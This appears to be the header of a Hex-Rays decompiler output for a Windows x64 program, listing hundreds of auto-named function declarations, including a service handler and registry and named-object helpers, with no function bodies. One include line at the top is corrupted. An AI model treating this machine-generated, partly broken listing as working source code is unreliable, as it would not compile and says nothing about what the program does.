/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2017 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <.h>lude <windows.h>
#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations


void __fastcall sub_140003C30(void *Src, _QWORD *a2);
__int64 __fastcall sub_140003CA0(__int64 a1);
_QWORD *__fastcall sub_140003CB0(_QWORD *a1, _QWORD *a2);
_QWORD *__fastcall sub_140003D30(_QWORD *a1, _BYTE *a2);
__int64 __fastcall sub_140003DA0(volatile signed __int32 **a1);
_QWORD *__fastcall sub_140003DE0(void *Src, _QWORD *a2, _QWORD *a3);
_QWORD *__fastcall sub_140003E90(_QWORD *a1, char a2);
__int64 sub_140003EC0();
_QWORD *__fastcall sub_140003FA0(void *Src);
_QWORD *__fastcall sub_140004170(void *Src);
_DWORD *__fastcall sub_1400043C0(void *Src);
__int64 __fastcall sub_140004720(_QWORD *a1, _QWORD *a2);
void __fastcall sub_140004790(void *Src, unsigned __int64 a2, size_t a3);
void __fastcall sub_1400048A0(void *Src, unsigned __int64 a2, __int64 a3);
bool __fastcall sub_1400049C0(size_t *a1, unsigned __int64 a2, char a3);
bool __fastcall sub_140004A90(__int64 *a1, unsigned __int64 a2, char a3);
_QWORD *__fastcall sub_140004B70(_QWORD *a1);
_QWORD *__fastcall sub_140004B80(_QWORD *a1, _QWORD *a2, unsigned __int64 a3, size_t a4);
_QWORD *__fastcall sub_140004CA0(void *Src, void *a2, size_t Size);
void **__fastcall sub_140004DF0(void *Dst, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4);
void **__fastcall sub_140004F20(void *Dst, void *Src, size_t Size);
_QWORD *__fastcall sub_140005050(void *Src, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4);
_QWORD *__fastcall sub_140005190(_QWORD *a1);
__int64 __fastcall sub_1400051A0(__int64 a1, __int64 a2, int a3);
bool __fastcall sub_1400051F0(__int64 a1, unsigned int a2, __int64 a3);
_QWORD *__fastcall sub_140005230(_QWORD *a1, unsigned __int64 a2, unsigned __int64 a3);
_QWORD *__fastcall sub_140005300(_QWORD *a1, unsigned __int64 a2, unsigned __int64 a3);
_QWORD *__fastcall sub_1400053B0(__int64 a1, _QWORD *a2, int a3);
_QWORD *__fastcall sub_140005420(__int64 a1, _QWORD *a2, int a3);
_QWORD *__fastcall sub_140005470(__int64 a1, _QWORD *a2, int a3);
const char *sub_1400054E0();
_QWORD *__fastcall sub_1400054F0(void *Src, _QWORD *a2);
struct _Thrd_imp_t *__fastcall sub_140005700(struct _Thrd_imp_t *a1, __int64 *a2, _QWORD *a3, _QWORD *a4);
__int64 __fastcall sub_140005840(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_140005900(__int64 a1, _QWORD *a2, _QWORD *a3);
// __int64 __fastcall sub_1400059B0(_QWORD); weak
_QWORD *__fastcall sub_140005A20(_QWORD *a1, _QWORD *a2);
_QWORD *__fastcall sub_140005A50(_QWORD *a1, _QWORD *a2);
__int64 __fastcall sub_140005A90(struct _Thrd_imp_t *a1, __int64 *a2);
_QWORD *__fastcall sub_140005B90(_QWORD *a1, __int64 a2, _QWORD *a3, _QWORD *a4);
void __fastcall sub_140005BC0(__int64 a1, __int64 a2, __int64 *a3);
__int64 __fastcall sub_140005C40(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, _QWORD *a5, _QWORD *a6);
void __fastcall sub_140005DB0(__int64 a1);
__int64 __fastcall sub_140005E20(__int64 a1);
void __fastcall sub_140005EB0(void **a1);
void __fastcall sub_140005EE0(__int64 a1);
void __fastcall sub_140005F40(_QWORD *a1);
void __fastcall sub_140006080(__int64 a1);
__int64 (__fastcall **__fastcall sub_1400060C0(__int64 a1))();
void __fastcall sub_140006110(__int64 a1);
void __fastcall sub_140006150(__int64 a1);
void __fastcall sub_1400061F0(__int64 a1);
void *__fastcall sub_140006210(void *a1, char a2);
_QWORD *__fastcall sub_140006240(void *a1, char a2);
_WORD *__fastcall sub_1400062B0(void *Src);
_BYTE *__fastcall sub_140006440(void *Src);
_QWORD *__fastcall sub_1400065A0(void *Src);
_QWORD *__fastcall sub_1400067C0(void *Src);
char *sub_140006A10();
_WORD *__fastcall sub_140006B50(void *Src);
_QWORD *__fastcall sub_140006CE0(void *Src);
_QWORD *__fastcall sub_140006EF0(void *Src);
void __fastcall sub_1400070C0(void **a1, __int64 *a2);
__int64 __fastcall sub_1400073F0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400076A0(void **a1, __int64 a2);
char __fastcall sub_140007800(__int64 a1);
void __fastcall sub_1400078E0(__int64 a1);
// __int64 __fastcall sub_140007990(_QWORD, _QWORD); weak
int __fastcall sub_140007BA0(__int64 a1);
__int64 __fastcall sub_140007C20(std::_Pad *a1);
void __fastcall sub_140007CF0(_QWORD *a1);
void __fastcall sub_140007D70(_QWORD *a1);
__int64 __fastcall sub_140007E30(__int64 (__fastcall ***a1)(_QWORD, signed __int64));
void __fastcall sub_140007E50(__int64 a1);
size_t *__fastcall sub_140007E80(size_t *a1, size_t a2, size_t a3, size_t *a4, size_t a5, size_t a6);
// size_t *__usercall sub_140008200@<rax>(void *Src@<rcx>, size_t a2@<rdx>, size_t a3@<r8>, char *a4@<r9>, size_t Size);
void sub_140008430();
_QWORD *__fastcall sub_140008450(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_1400084C0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_140008530(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_1400085A0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_140008610(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_140008680(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_1400086F0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_140008760(_QWORD *a1, __int64 a2);
void __fastcall sub_1400087D0(__int64 a1, __int64 a2, __int64 *a3);
__int64 __fastcall sub_140008850(__int64 a1);
_QWORD *__fastcall sub_140008890(_QWORD *a1, char a2);
_QWORD *__fastcall sub_1400088C0(_QWORD *a1, char a2);
_QWORD *__fastcall sub_140008900(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_1400091F0(void *Src);
void __fastcall sub_140009400(__int64 a1);
__int64 __fastcall sub_140009460(__int64 a1);
__int64 sub_140009480();
__int64 sub_1400094A0();
_BOOL8 sub_1400095F0();
char sub_1400096E0();
_QWORD *__fastcall sub_140009740(void *Src);
_QWORD *__fastcall sub_140009950(void *Src);
_DWORD *__fastcall sub_140009B20(void *Src);
char *sub_140009CC0();
char *sub_140009E90();
_QWORD *__fastcall sub_140009FC0(void *Src);
char *sub_14000A190();
__int64 sub_14000A360();
bool sub_14000A6C0();
_BOOL8 sub_14000A780();
_BOOL8 sub_14000A830();
void sub_14000A900();
// __int64 sub_14000A910(void); weak
__int64 __fastcall sub_14000AA50(__int64 a1, __int64 a2);
__int64 __fastcall HandlerProc(__int64 dwControl, __int64 dwEventType, LPVOID lpEventData, LPVOID lpContext);
int sub_14000AD10();
void __fastcall sub_14000AEF0(char a1);
__int64 sub_14000B000();
char sub_14000B010();
_BOOL8 sub_14000B0D0();
__int64 sub_14000B190();
_QWORD *__fastcall sub_14000B2F0(void *Src);
_QWORD *__fastcall sub_14000B690(void *Src);
// __int64 sub_14000B8D0(void); weak
signed __int64 __fastcall sub_14000B9E0(_QWORD *a1, _QWORD *a2);
__int64 __fastcall sub_14000BA60(__int64 *a1);
_QWORD *__fastcall sub_14000BB70(_QWORD *a1, const char *a2, int a3, int a4, int a5);
__int64 __fastcall sub_14000BCC0(_QWORD *a1);
__int64 __fastcall sub_14000BD30(__int64 *a1);
void __fastcall sub_14000BD90(__int64 a1);
void __fastcall sub_14000BE30(char **a1);
void __fastcall sub_14000BEC0(_QWORD *a1);
void *__fastcall sub_14000BF3C(__int64 a1, char a2);
void *__fastcall sub_14000BF50(void *a1, char a2);
void *__fastcall sub_14000BF80(__int64 a1, char a2);
_QWORD *__fastcall sub_14000BFC0(_QWORD *a1);
_QWORD *__fastcall sub_14000C110(void *Src);
__int64 __fastcall sub_14000C320(const char *a1, bool *a2, bool *a3);
char __fastcall sub_14000C4F0(__int64 a1);
void __fastcall sub_14000C720(__int64 a1, __int64 *a2);
void __fastcall sub_14000C7B0(__int64 a1);
// __int64 __fastcall std::basic_filebuf<char,std::char_traits<char>>::_Reset_back(_QWORD); weak
_QWORD *__fastcall sub_14000C800(__int64 a1, _QWORD *a2);
// __int64 __fastcall std::basic_filebuf<char,std::char_traits<char>>::_Set_back(_QWORD); weak
void __fastcall sub_14000C8B0(__int64 a1);
_QWORD *__fastcall sub_14000C8D0(_QWORD *a1, unsigned __int64 a2, char a3);
__int64 __fastcall sub_14000C9E0(__int64 a1);
__int64 *__fastcall sub_14000CA70(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4);
__int64 *__fastcall sub_14000CB70(_QWORD *a1, __int64 *a2, __int64 a3);
char __fastcall sub_14000CF60(__int64 a1, __int64 *a2);
__int64 __fastcall sub_14000CFB0(__int64 a1, const char *a2, int a3, int a4);
signed __int64 __fastcall sub_14000D3C0(__int64 a1, unsigned int a2);
__int64 __fastcall sub_14000D470(__int64 a1, __int64 a2, __int64 a3, int a4);
__int64 __fastcall sub_14000D560(__int64 a1, __int64 a2, __int64 *a3);
__int64 __fastcall sub_14000D640(__int64 a1, char *a2, size_t a3);
signed __int64 __fastcall sub_14000D700(_QWORD *a1);
signed __int64 __fastcall sub_14000D750(__int64 a1);
signed __int64 __fastcall sub_14000DA50(__int64 a1);
_QWORD *__fastcall sub_14000DAC0(_QWORD *a1, void *a2, _BYTE *a3);
size_t *__fastcall sub_14000DB10(void *Src, _QWORD *a2, _BYTE *a3);
__int64 __fastcall sub_14000DBF0(__int64 a1, _QWORD *a2);
void __fastcall sub_14000DD60(__int64 a1);
BOOL __fastcall sub_14000DDC0(__int64 a1);
bool __fastcall sub_14000DDF0(LPCSTR lpName);
bool __fastcall sub_14000DE40(LPCSTR lpName, DWORD dwMilliseconds);
// __int64 __fastcall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::reserve(_QWORD, _QWORD); weak
_QWORD *__fastcall sub_14000DF00(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000DF70(_QWORD *a1, __int64 a2, _DWORD **a3);
volatile signed __int32 *__fastcall sub_14000DFC0(_QWORD *a1, volatile signed __int32 *a2, void *a3, _QWORD *a4, __int64 a5, _QWORD *a6);
// volatile signed __int32 *__usercall sub_14000E2A0@<rax>(volatile signed __int32 *a1@<rdx>, __int64 **a2@<rcx>, __int64 *a3@<r8>, int *a4@<r9>, __int64 a5);
__int64 __fastcall sub_14000E510(__int64 **a1, __int64 a2, void *a3, int *a4, volatile signed __int32 **a5);
void __fastcall sub_14000E670(__int64 a1, __int64 a2, __int64 *a3);
_QWORD *__fastcall sub_14000E6F0(_QWORD *a1);
__int64 (__fastcall **__fastcall sub_14000E780(__int64 a1))();
__int64 *__fastcall sub_14000E810(__int64 **a1, _DWORD *a2);
void *__fastcall sub_14000E8B0(void *a1, char a2);
char __fastcall sub_14000E8E0(__int64 a1, _DWORD *a2, __int64 *a3);
char __fastcall sub_14000E920(__int64 a1);
void sub_14000E990();
_QWORD *__fastcall sub_14000E9E0(_QWORD *a1);
void __fastcall sub_14000EA40(__int64 a1, volatile signed __int32 **a2);
void __fastcall sub_14000EA90(__int64 a1, _QWORD *a2);
void __fastcall sub_14000EB10(__int64 a1);
__int64 *__fastcall sub_14000EB20(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_14000EC20(_QWORD *a1, _QWORD *a2, _QWORD *a3);
void *__fastcall sub_14000ECB0(void *a1, char a2);
char __fastcall sub_14000ED40(_QWORD *a1);
_QWORD *__fastcall sub_14000EF00(void *Src);
_QWORD *__fastcall sub_14000F0D0(_QWORD *a1, _QWORD *a2);
_QWORD *__fastcall sub_14000F120(void *a1, char a2);
bool __fastcall sub_14000F180(__int64 a1);
// __int64 __fastcall sub_14000F200(_QWORD); weak
__int64 __fastcall sub_14000F270(__int64 *a1, __int64 a2);
_QWORD *__fastcall sub_14000F350(_QWORD *a1, _QWORD *a2);
bool __fastcall sub_14000F420(__int64 a1);
bool __fastcall sub_14000F430(__int64 a1);
void __fastcall sub_14000F440(__int64 a1);
bool __fastcall sub_14000F470(CHAR *a1, __int64 a2);
_QWORD *__fastcall sub_14000F490(_QWORD *a1, _QWORD *a2);
_QWORD *__fastcall sub_14000F530(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000F5A0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000F610(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000F680(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000F6F0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000F760(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000F7D0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000F840(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000F8B0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14000F920(_QWORD *a1, _QWORD *a2);
_QWORD *__fastcall sub_14000F980(_QWORD *a1, _QWORD *a2, void *a3, _QWORD *a4, __int64 a5, _QWORD *a6);
// __int64 __usercall sub_14000FC30@<rax>(__int64 a1@<rdx>, _QWORD **a2@<rcx>, void *a3@<r8>, const void **a4@<r9>, void *a5);
_QWORD *__fastcall sub_14000FEB0(_QWORD *a1, const struct std::exception *a2);
// __int64 __fastcall sub_14000FEE0(_QWORD); weak
// __int64 __fastcall sub_1400102F0(_QWORD); weak
_QWORD *__fastcall sub_140010700(_QWORD *a1, _QWORD *a2, _QWORD *a3);
__int64 __fastcall sub_140010760(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140010840(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140010920(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140010A00(__int64 *a1, __int64 a2);
void __fastcall sub_140010AE0(__int64 a1, __int64 a2, __int64 *a3);
void __fastcall __noreturn sub_140010B60(const struct std::exception *a1);
_QWORD *__fastcall sub_140010BA0(_QWORD *a1, const struct std::exception *a2, __int64 a3, int a4);
_QWORD *__fastcall sub_140010C60(_QWORD *a1, const struct std::exception *a2, int a3);
_QWORD *__fastcall sub_140010D20(_QWORD *a1, const struct std::exception *a2, int a3);
_QWORD *__fastcall sub_140010DB0(_QWORD *a1, __int64 a2, int a3);
_QWORD *__fastcall sub_140010E40(_QWORD *a1, __int64 a2, int a3);
std::exception *__fastcall sub_140010ED0(std::exception *a1, const struct std::exception *a2);
__int64 *__fastcall sub_140010F60(__int64 *a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, __int64 *a5, __int64 *a6);
std::exception *__fastcall sub_1400111B0(std::exception *a1, const struct std::exception *a2);
_QWORD *__fastcall sub_1400111E0(_QWORD *a1, __int64 a2);
// __int64 __cdecl sub_140011270(_QWORD); weak
_QWORD *__fastcall sub_140011300(_QWORD *a1);
_QWORD *__fastcall sub_140011310(_QWORD *a1, __int64 a2);
std::exception *__fastcall sub_140011370(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_1400113E0(std::exception *a1, const struct std::exception *a2);
void **__fastcall sub_140011410(_QWORD *a1);
void **__fastcall sub_1400114A0(_QWORD *a1);
__int64 __fastcall sub_140011530(_QWORD *a1);
void __fastcall sub_1400115B0(__int64 **a1);
void __fastcall sub_1400115E0(__int64 a1);
void __fastcall sub_140011660(__int64 a1);
void __fastcall sub_1400116E0(_QWORD *a1);
void __fastcall sub_140011710(__int64 a1);
// __int64 __fastcall sub_140011760(_QWORD); weak
void **__fastcall sub_140011940(_QWORD *a1);
void **__fastcall sub_1400119A0(_QWORD *a1);
void __fastcall sub_1400119B0(_QWORD *a1);
__int64 __fastcall sub_140011A00(__int64 a1);
_QWORD *__fastcall sub_140011A50(_QWORD *a1, __int64 *a2);
void **__fastcall sub_140011AE0(_QWORD *a1);
void **__fastcall sub_140011B40(_QWORD *a1);
void **__fastcall sub_140011B60(_QWORD *a1);
_QWORD *__fastcall sub_140011B80(__int64 a1, char a2);
_QWORD *__fastcall sub_140011B94(__int64 a1, char a2);
_QWORD *__fastcall sub_140011BA0(__int64 a1, char a2);
_QWORD *__fastcall sub_140011BB0(__int64 a1, char a2);
_QWORD *__fastcall sub_140011BBC(__int64 a1, char a2);
_QWORD *__fastcall sub_140011BCC(__int64 a1, char a2);
void *__fastcall sub_140011BD8(__int64 a1, char a2);
_QWORD *__fastcall sub_140011BE4(__int64 a1, char a2);
_QWORD *__fastcall sub_140011BF0(void *a1, char a2);
_QWORD *__fastcall sub_140011C70(void *a1, char a2);
_QWORD *__fastcall sub_140011CB0(void *a1, char a2);
void *__fastcall sub_140011CF0(void *a1, char a2);
_QWORD *__fastcall sub_140011D20(_QWORD *a1, char a2);
void *__fastcall sub_140011D50(void *a1, char a2);
_QWORD *__fastcall sub_140011D90(void *a1, char a2);
_QWORD *__fastcall sub_140011E00(_QWORD *a1, char a2);
_QWORD *__fastcall sub_140011E30(void *a1, char a2);
__int64 __fastcall sub_140011EA0(__int64 a1, _QWORD *a2, __int64 *a3, __int64 a4, _QWORD *a5, _QWORD *a6, __int64 *a7);
// __int64 __fastcall sub_140011F50(_QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall sub_140012520(_QWORD, _QWORD, _QWORD); weak
_DWORD *__fastcall sub_140012790(void *Src);
_QWORD *__fastcall sub_140012930(void *Src);
void __fastcall sub_140012B00(_QWORD *a1, __int64 a2, _QWORD *a3, _QWORD *a4, __int64 **a5, char a6, char a7);
void sub_140012FA0();
_QWORD *__fastcall sub_140012FF0(_QWORD *a1);
__int64 __fastcall sub_140013050(__int64 a1, void **a2);
signed __int64 __fastcall sub_140013108(__int64 a1);
signed __int64 __fastcall sub_140013120(__int64 a1);
signed __int64 __fastcall sub_140013184(__int64 a1);
signed __int64 __fastcall sub_140013190(__int64 a1);
__int64 __fastcall sub_140013260(__int64 a1);
// __int64 __fastcall sub_140013270(_QWORD); weak
__int64 __fastcall sub_140013340(__int64 a1, __int64 a2);
HANDLE __fastcall sub_140013410(BOOL bManualReset, BOOL bInitialState);
__int64 *__fastcall sub_1400134D0(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_1400135D0(_QWORD *a1, _QWORD *a2, __int64 *a3);
HANDLE __fastcall sub_1400139E0(__int64 a1);
__int64 __fastcall sub_140013A30(unsigned int *a1, __int64 a2);
void __fastcall __noreturn sub_140013A58(__int64 a1);
void __fastcall __noreturn sub_140013A70(__int64 a1);
void __fastcall __noreturn sub_140013B98(__int64 a1, __int64 a2, __int64 a3);
void __fastcall __noreturn sub_140013BB0(__int64 a1, __int64 a2, __int64 a3);
void __fastcall __noreturn sub_140013C84(__int64 a1, __int64 a2, __int64 a3);
void __fastcall __noreturn sub_140013C90(__int64 a1, __int64 a2, __int64 a3);
_QWORD *__fastcall sub_140013D70(std::exception *a1);
_BOOL8 __fastcall sub_140013E60(__int64 a1, void *a2);
__int64 __fastcall sub_140013EC0(__int64 a1, __int64 a2, __int64 a3);
_QWORD *__fastcall sub_140013F40(void *Src);
__int64 __fastcall sub_140014150(__int64 a1, __int64 a2, __int64 a3);
_QWORD *__fastcall sub_1400141D0(_QWORD *a1, const wchar_t *a2);
_BOOL8 __fastcall sub_140014220(__int64 a1, __int64 *a2);
_OWORD *__fastcall sub_140014520(__int64 a1, __int64 a2, _OWORD *a3);
void __fastcall sub_140014600(__int64 *a1);
void __fastcall sub_140014720(__int64 *a1);
unsigned __int64 __fastcall sub_140014840(_QWORD *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_1400148A0(__int64 *a1, unsigned __int64 a2);
__int64 __fastcall sub_140014980(__int64 *a1, unsigned __int64 a2);
void __fastcall sub_140014A20(__int64 *a1, __int128 *a2);
void **__fastcall sub_140014BB0(void *Src);
bool sub_140015200();
char __fastcall sub_140015290(char a1);
_QWORD *__fastcall sub_1400153D0(void *Src);
// __int64 __fastcall sub_1400157C0(_QWORD); weak
_QWORD *__fastcall sub_140015900(void *Src);
_QWORD *__fastcall sub_140015D20(void *Src);
// __int64 __fastcall sub_140015F60(_QWORD, _QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_140016030(__int64 a1, HKEY a2, __int64 a3, const CHAR *a4, DWORD Type);
_QWORD *__fastcall sub_140016160(_QWORD *a1, _QWORD *a2);
_QWORD *__fastcall sub_1400161A0(_QWORD *a1, __int64 a2, _DWORD **a3);
void __fastcall sub_1400161F0(void *Src, char *a2, char *a3);
_QWORD *__fastcall sub_140016340(_QWORD *a1, _QWORD *a2, char a3, _QWORD *a4, _QWORD *a5);
// _QWORD *__usercall sub_140016610@<rax>(void *a1@<rcx>, _QWORD *a2@<rdx>, __int64 *a3@<r8>, unsigned int *a4@<r9>, __int64 a5);
__int64 __fastcall sub_140016870(void *a1, __int64 a2, void *a3, unsigned int *a4, void *a5);
__int64 __fastcall sub_1400169D0(_QWORD *a1, __int64 a2, char a3, unsigned __int64 *a4);
_QWORD *__fastcall sub_140016B30(_QWORD *a1, _QWORD *a2, _QWORD *a3);
_QWORD *__fastcall sub_140016B70(_QWORD *a1, _QWORD *a2, _QWORD *a3);
_QWORD *__fastcall sub_140016BC0(_QWORD *a1, const struct std::exception *a2);
_QWORD *__fastcall sub_140016BF0(_QWORD *a1, const struct std::exception *a2);
_QWORD *__fastcall sub_140016C20(_QWORD *a1, const struct std::exception *a2);
_QWORD *__fastcall sub_140016C50(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_140016C80(_QWORD *a1, __int64 a2);
std::exception *__fastcall sub_140016CB0(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140016D00(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140016D50(std::exception *a1, const struct std::exception *a2);
char *__fastcall sub_140016DA0(_OWORD *a1);
char **__fastcall sub_140016E50(char **a1, _OWORD *a2);
// __int64 __fastcall sub_140016E80(_QWORD); weak
void __fastcall __noreturn sub_140017280(const struct std::exception *a1);
void __fastcall __noreturn sub_1400172C0(const struct std::exception *a1);
void __fastcall __noreturn sub_140017300(const struct std::exception *a1);
// __int64 __fastcall sub_140017340(_QWORD); weak
// __int64 __fastcall sub_140017380(_QWORD); weak
_QWORD *__fastcall sub_1400173C0(_QWORD *a1, const struct std::exception *a2, __int64 a3, int a4);
_QWORD *__fastcall sub_140017480(_QWORD *a1, const struct std::exception *a2, int a3);
_QWORD *__fastcall sub_140017540(_QWORD *a1, const struct std::exception *a2, int a3);
_QWORD *__fastcall sub_1400175D0(_QWORD *a1, const struct std::exception *a2, __int64 a3, int a4);
_QWORD *__fastcall sub_140017690(_QWORD *a1, const struct std::exception *a2, int a3);
_QWORD *__fastcall sub_140017750(_QWORD *a1, const struct std::exception *a2, int a3);
_QWORD *__fastcall sub_1400177E0(_QWORD *a1, const struct std::exception *a2, __int64 a3, int a4);
_QWORD *__fastcall sub_1400178A0(_QWORD *a1, const struct std::exception *a2, int a3);
_QWORD *__fastcall sub_140017960(_QWORD *a1, const struct std::exception *a2, int a3);
_QWORD *__fastcall sub_1400179F0(_QWORD *a1, __int64 a2, __int64 a3, int a4);
_QWORD *__fastcall sub_140017AB0(_QWORD *a1, __int64 a2, int a3);
_QWORD *__fastcall sub_140017B70(_QWORD *a1, __int64 a2, int a3);
_QWORD *__fastcall sub_140017C00(_QWORD *a1, __int64 a2, __int64 a3, int a4);
_QWORD *__fastcall sub_140017CC0(_QWORD *a1, __int64 a2, int a3);
_QWORD *__fastcall sub_140017D80(_QWORD *a1, __int64 a2, int a3);
signed __int64 *__fastcall sub_140017E10(signed __int64 *a1, unsigned int *a2, signed __int64 *a3);
_DWORD *__fastcall sub_140017EE0(_DWORD *a1, __int16 a2, unsigned __int16 a3, unsigned __int16 a4);
std::exception *__fastcall sub_140017FB0(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140018040(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_1400180D0(std::exception *a1, const struct std::exception *a2);
// __int64 __cdecl sub_140018160(_QWORD); weak
// __int64 __cdecl sub_1400181F0(_QWORD); weak
// __int64 __fastcall sub_140018280(_QWORD); weak
std::exception *__fastcall sub_140018310(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140018340(std::exception *a1);
std::exception *__fastcall sub_1400183F0(std::exception *a1);
std::exception *__fastcall sub_1400184A0(std::exception *a1);
// __int64 __fastcall sub_140018550(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
_DWORD *__fastcall sub_140018630(_DWORD *a1, int a2);
__int64 __fastcall sub_1400186C0(__int64 a1);
_QWORD *__fastcall sub_140018750(_QWORD *a1, int a2);
__int64 __fastcall sub_1400187C0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140018850(std::exception *a1);
__int64 __fastcall sub_1400188E0(std::exception *a1);
__int64 __fastcall sub_140018970(std::exception *a1);
__int64 __fastcall sub_140018A00(std::exception *a1);
__int64 __fastcall sub_140018A90(std::exception *a1);
__int64 __fastcall sub_140018AE0(std::exception *a1);
void __fastcall sub_140018B40(volatile signed __int32 **a1);
void __fastcall sub_140018B80(_QWORD *a1);
signed int __fastcall sub_140018B90(volatile signed __int32 **a1);
void __fastcall sub_140018BD0(__int64 **a1);
void __fastcall sub_140018C10(__int64 a1);
__int64 __fastcall sub_140018C40(__int64 **a1);
__int64 __fastcall sub_140018C80(volatile signed __int32 ***a1);
void __fastcall sub_140018CC0(__int64 a1);
__int64 __fastcall sub_140018D40(__int64 a1);
void __fastcall sub_140018E80(__int64 a1);
int __fastcall sub_140018F50(volatile signed __int32 **a1);
volatile signed __int32 **__fastcall sub_140018FB0(volatile signed __int32 **a1, volatile signed __int32 **a2);
__int64 *__fastcall sub_140019030(void *a1, _DWORD *a2);
void **__fastcall sub_1400190D0(std::exception *a1);
void **__fastcall sub_1400190F0(std::exception *a1);
void **__fastcall sub_140019110(std::exception *a1);
void **__fastcall sub_140019130(std::exception *a1);
void **__fastcall sub_140019150(_QWORD *a1);
_QWORD *__fastcall sub_1400191AC(__int64 a1, char a2);
_QWORD *__fastcall sub_1400191BC(__int64 a1, char a2);
_QWORD *__fastcall sub_1400191C8(__int64 a1, char a2);
_QWORD *__fastcall sub_1400191D8(__int64 a1, char a2);
_QWORD *__fastcall sub_1400191E4(__int64 a1, char a2);
_QWORD *__fastcall sub_1400191F4(__int64 a1, char a2);
_QWORD *__fastcall sub_140019200(__int64 a1, char a2);
_QWORD *__fastcall sub_140019210(__int64 a1, char a2);
_QWORD *__fastcall sub_14001921C(__int64 a1, char a2);
_QWORD *__fastcall sub_140019230(__int64 a1, char a2);
std::exception *__fastcall sub_14001923C(__int64 a1, char a2);
std::exception *__fastcall sub_140019248(__int64 a1, char a2);
_QWORD *__fastcall sub_140019260(void *a1, char a2);
_QWORD *__fastcall sub_1400192A0(void *a1, char a2);
_QWORD *__fastcall sub_1400192E0(void *a1, char a2);
_QWORD *__fastcall sub_140019320(void *a1, char a2);
_QWORD *__fastcall sub_140019360(void *a1, char a2);
std::exception *__fastcall sub_1400193E0(void *a1, char a2);
std::exception *__fastcall sub_140019450(void *a1, char a2);
void *__fastcall sub_1400194C0(void *a1, char a2);
void *__fastcall sub_1400194F0(void *a1, char a2);
void __fastcall sub_140019520(_QWORD *a1);
_QWORD *__fastcall sub_140019640(void *Src);
char *sub_140019810();
_QWORD *__fastcall sub_140019940(void *Src);
HANDLE __fastcall sub_140019B40(unsigned int *a1);
_QWORD *__fastcall sub_140019E80(void *Src);
_QWORD *__fastcall sub_14001A160(void *Src);
_QWORD *__fastcall sub_14001A400(void *Src);
signed __int64 sub_14001A620();
bool __fastcall sub_14001A6B0(__int64 a1);
HANDLE __fastcall sub_14001AC40(__int64 a1, HANDLE *a2);
__int64 __fastcall sub_14001AE70(void **a1, __int64 a2);
int __fastcall sub_14001B080(LPCSTR lpName, char a2);
// __int64 __fastcall sub_14001B170(_QWORD); weak
void sub_14001B230();
bool __fastcall sub_14001B240(__int64 a1, _DWORD *a2);
char __fastcall sub_14001B530(__int64 a1, unsigned int *a2);
void sub_14001BCC0();
void sub_14001BD10();
void sub_14001BD60();
_QWORD *__fastcall sub_14001BDB0(_QWORD *a1);
_QWORD *__fastcall sub_14001BE10(_QWORD *a1);
void __fastcall sub_14001BE70(__int64 a1, __int64 *a2, __int64 *a3);
signed __int64 __fastcall sub_14001BF00(__int64 a1, volatile signed __int32 **a2, volatile signed __int32 **a3);
_QWORD *__fastcall sub_14001BF70(__int64 a1, __int64 a2);
char *__fastcall sub_14001BFD0(__int64 a1, unsigned __int64 a2);
char *__fastcall sub_14001C0A0(__int64 a1, unsigned __int64 a2);
void __fastcall sub_14001C170(void **a1, unsigned __int64 a2);
signed __int64 __fastcall sub_14001C230(__int64 **a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_14001C300(_QWORD *a1, unsigned __int64 a2);
void __fastcall sub_14001C390(__int64 a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_14001C420(__int64 a1, unsigned __int64 a2);
_QWORD *__fastcall sub_14001C4B0(void *Src, unsigned __int64 a2, __int16 a3);
signed __int64 __fastcall sub_14001C5D4(__int64 a1);
signed __int64 __fastcall sub_14001C5E0(__int64 a1);
signed __int64 __fastcall sub_14001C644(__int64 a1);
signed __int64 __fastcall sub_14001C650(__int64 a1);
signed __int64 __fastcall sub_14001C6B4(__int64 a1);
